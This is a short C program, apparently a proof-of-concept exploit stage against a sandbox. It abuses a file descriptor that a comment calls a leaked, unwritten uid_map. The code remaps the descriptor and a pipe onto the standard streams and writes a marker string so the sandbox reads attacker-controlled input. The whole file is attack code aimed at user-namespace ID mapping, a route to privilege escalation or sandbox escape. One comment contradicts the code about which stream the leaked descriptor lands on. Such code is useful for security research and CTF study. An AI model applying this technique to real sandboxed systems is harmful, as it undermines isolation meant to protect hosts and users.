#define _GNU_SOURCE         /* See feature_test_macros(7) */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <signal.h>
#include <stdbool.h>
#include <errno.h>
#include <sys/syscall.h>
#include <unistd.h>

#define LEAKED_FD_NUMBER (6) // The FD number of the uid_map that is leaked and not-written into.
#define OUR_STDIN (100)
#define OUR_STDOUT (101)

int main(void) {
    int pipefds[2] = {0};

    if (pipe(pipefds) == -1) {
        perror("pipe");
        exit(1);
    }
    
    // Map the leaked fd to stdout, and the pipe read-end to stdout such that the sandbox can read from it.
    dup2(LEAKED_FD_NUMBER, 0);
    dup2(pipefds[0], 1);

    // Map the pipe write-end to our stdout as we will write to it.
    dup2(pipefds[1], OUR_STDOUT);
    
    // Write to the sandbox
    write(OUR_STDOUT, "AAAAAA!\n", 8);
    sleep(100);
    return 0;
}